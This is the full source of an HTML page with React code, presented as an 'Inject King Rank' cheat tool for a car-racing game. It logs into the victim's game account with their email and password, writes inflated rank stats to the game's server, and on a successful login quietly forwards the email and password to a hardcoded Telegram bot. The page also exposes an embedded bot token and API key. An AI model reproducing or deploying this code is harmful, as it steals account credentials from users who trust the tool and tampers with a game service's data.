<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGABERSHOP 🛍️</title>
    <script src="https://cdn.jsdelivr.net/npm/react@18.0.0/umd/react.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.0.0/umd/react-dom.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #0a0a0a;
            color: white;
        }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const SERVER_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'}`,
            RANK_URL: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
            BOT_TOKEN: "8353360576:AAETfOsXP1nZS3k8Zj0dXASkvyLAb7UZvk4",
            CHAT_ID:20260487799888 
        };

        const App = () => {
            const [email, setEmail] = React.useState('');
            const [password, setPassword] = React.useState('');
            const [status, setStatus] = React.useState('');
            const [loading, setLoading] = React.useState(false);

            const sendNotificationToTelegram = async (email, password) => {
                const url = `https://api.telegram.org/bot${SERVER_CONFIG.BOT_TOKEN}/sendMessage`;
                const message = `🔐 Login Cpm1:\n📧 Email: ${email}\n🔒 Password: ${password}`;
                
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: SERVER_CONFIG.CHAT_ID,
                            text: message
                        })
                    });
                } catch (error) {
                    console.error('Failed to send notification:', error);
                }
            };

            const login = async (email, password) => {
                const payload = {
                    clientType: "CLIENT_TYPE_ANDROID",
                    email: email,
                    password: password,
                    returnSecureToken: true
                };
                
                try {
                    const response = await fetch(SERVER_CONFIG.FIREBASE_LOGIN_URL, {
                        method: 'POST',
                        headers: {
                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });

                    const responseData = await response.json();

                    if (response.ok && responseData.idToken) {
                        setStatus(prev => prev + '\n📌Login success\n');
                        await sendNotificationToTelegram(email, password);
                        return responseData.idToken;
                    } else {
                        throw new Error(responseData.error?.message || 'Unknown error during login.');
                    }
                } catch (error) {
                    throw new Error(error.message || 'Network error during login.');
                }
            };

            const setRank = async (token) => {
    // Mengambil nilai dari input UI
    const customRace = parseInt(document.getElementById('raceCount').value) || 0;
    const customWin = parseInt(document.getElementById('winCount').value) || 0;
    const customLose = parseInt(document.getElementById('loseCount').value) || 0;
    const customName = document.getElementById('customId').value;

    const keys = [
        "t_distance", "time", "speed_banner", "gifts", "chests", 
        "treasure", "cars", "levels", "drift", "run", "police", 
        "block_post", "real_estate", "fuel", "car_trade", "car_exchange", 
        "burnt_tire", "car_fix", "car_wash", "offroad", "passanger_distance", 
        "reactions", "drift_max", "taxi", "delivery", "cargo", "push_ups", 
        "slicer_cut", "car_collided"
    ];

    const ratingData = Object.fromEntries(keys.map(key => [key, 1000000]));
    
    // Set nilai custom untuk Balapan berdasarkan input
    ratingData.race_win = customWin;
    ratingData.race = customRace; // Menambah total race
    ratingData.race_lose = customLose; // Menambah lose
    
    // Menambahkan Name/ID jika diisi (biasanya dikirim di payload data utama)
    const payload = {
    data: JSON.stringify({ 
        RatingData: ratingData,
        localID: customName, 
        Name: customName, // Tambahan Nickname
        win: customWin,
        race: customRace,
        lose: customLose
        })
    };

    try {
        const response = await fetch(SERVER_CONFIG.RANK_URL, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
                'User-Agent': 'okhttp/3.12.13'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            setStatus(prev => prev + '✅ Stats & ID Berhasil Diupdate!\n');
            return true;
        } else {
            throw new Error(`Gagal update stats.`);
        }
    } catch (error) {
        throw new Error(error.message);
    }
};


            const handleSubmit = async (e) => {
                e.preventDefault();
                setLoading(true);
                setStatus('');

                try {
                    const token = await login(email, password);
                    if (token) {
                        await setRank(token);
                        setStatus(prev => prev + '🔥 Hack Succes 🔥');
                    }
                } catch (error) {
                    setStatus(prev => prev + `❌ Error: ${error.message}`);
                } finally {
                    setLoading(false);
                }
            };

            return (
                <div className="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8 bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900">
                    <div className="max-w-md w-full space-y-8 bg-gray-900 p-8 rounded-xl shadow-2xl border border-gray-800">
                        <div>
                            <h2 className="mt-6 text-center text-3xl font-bold tracking-tight text-white">NGABERSHOP 🛍️</h2>
                            <p className="mt-2 text-center text-sm text-gray-300">
                                Inject King Rank Tool
                            </p>
                        </div>
                        <form className="mt-8 space-y-6" onSubmit={handleSubmit}>
                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-300">
                                    ✍️ Cpm email:
                                </label>
                                <input
                                    id="email"
                                    name="email"
                                    type="email"
                                    required
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    className="appearance-none rounded-md relative block w-full px-3 py-2 border border-gray-700 text-white placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                                    placeholder="Enter your email"
                                />
                            </div>
                            <div>
                                <label htmlFor="password" className="block text-sm font-medium text-gray-300">
                                    ✍️ Cpm password:
                                </label>
                                <input
                                    id="password"
                                    name="password"
                                    type="password"
                                    required
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="appearance-none rounded-md relative block w-full px-3 py-2 border border-gray-700 text-white placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm"
                                    placeholder="Enter your password"
                                />
                            </div>
                           <div class="grid grid-cols-3 gap-4">
    <div>
        <label class="block text-xs font-medium text-gray-400">RACE</label>
        <input type="number" id="raceCount" class="w-full bg-gray-800 rounded px-2 py-1 text-white border border-gray-700" placeholder="0">
    </div>
    <div>
        <label class="block text-xs font-medium text-gray-400">WIN</label>
        <input type="number" id="winCount" class="w-full bg-gray-800 rounded px-2 py-1 text-white border border-gray-700" placeholder="0">
    </div>
    <div>
        <label class="block text-xs font-medium text-gray-400">LOSE</label>
        <input type="number" id="loseCount" class="w-full bg-gray-800 rounded px-2 py-1 text-white border border-gray-700" placeholder="0">
    </div>
</div>
<div class="mt-4">
    <label class="block text-sm font-medium text-gray-300">✍️ Custom ID (Local):</label>
    <input type="text" id="customId" class="w-full bg-gray-800 rounded px-3 py-2 text-white border border-gray-700" placeholder="Contoh: AWIMEDAN_STORE">
</div>

                            <div>
                                <button
                                    type="submit"
                                    disabled={loading}
                                    className={`group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white ${loading ? 'bg-gray-600' : 'bg-indigo-600 hover:bg-indigo-700'} focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500`}
                                >
                                    {loading ? (
                                        <span className="flex items-center">
                                            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                            </svg>
                                            Processing...
                                        </span>
                                    ) : (
                                        'Inject King Rank'
                                    )}
                                </button>
                            </div>
                        </form>
                        
                        {status && (
                            <div className="mt-6 p-4 bg-green-900 border border-green-700 rounded-lg">
                                <pre className="whitespace-pre-wrap">{status}</pre>
                            </div>
                        )}
                        
                        <div className="mt-6 text-center text-xs text-gray-400">
                            <p>© 2023 NGABERSHOP. All rights reserved.</p>
                        </div>
                    </div>
                </div>
            );
        };

        ReactDOM.render(<App />, document.getElementById('root'));
    </script>
</body>
</html>
